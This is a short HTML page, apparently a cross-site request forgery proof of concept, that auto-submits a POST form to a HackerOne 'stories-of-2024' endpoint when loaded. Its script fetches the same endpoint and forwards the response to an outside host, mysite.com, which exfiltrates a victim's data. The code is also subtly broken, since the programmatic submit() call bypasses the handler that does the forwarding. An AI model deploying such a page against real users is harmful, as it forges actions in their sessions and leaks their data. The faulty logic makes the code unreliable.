<html>
  <body>
    <form id="submissionForm" action="https://hackerone.com/stories-of-2024/new" method="POST">
      <input type="submit" value="Submit request" />
    </form>

    <script>
      // Override the form submission to prevent the default behavior
      document.getElementById('submissionForm').onsubmit = function(event) {
        event.preventDefault();  // Prevent the form from submitting normally

        // Send the request using fetch
        fetch('https://hackerone.com/stories-of-2024/new', {
          method: 'POST',
          body: new FormData(this)  // Send the form data
        })
        .then(response => response.text())  // Assuming the response is text
        .then(data => {
          // Now, send the received data to the new URL
          fetch('https://mysite.com/confirmed/submissions', {
            method: 'POST',
            body: JSON.stringify({ response: data }),  // Assuming you want to send the response data as JSON
            headers: {
              'Content-Type': 'application/json'  // Set the proper header for JSON
            }
          })
          .then(confirmResponse => {
            // Handle confirmation response if needed
            console.log('Response confirmed');
          })
          .catch(error => {
            console.error('Error confirming submission:', error);
          });
        })
        .catch(error => {
          console.error('Error in submission request:', error);
        });
      };

      // Trigger form submission programmatically
      document.getElementById('submissionForm').submit();
    </script>
  </body>
</html>
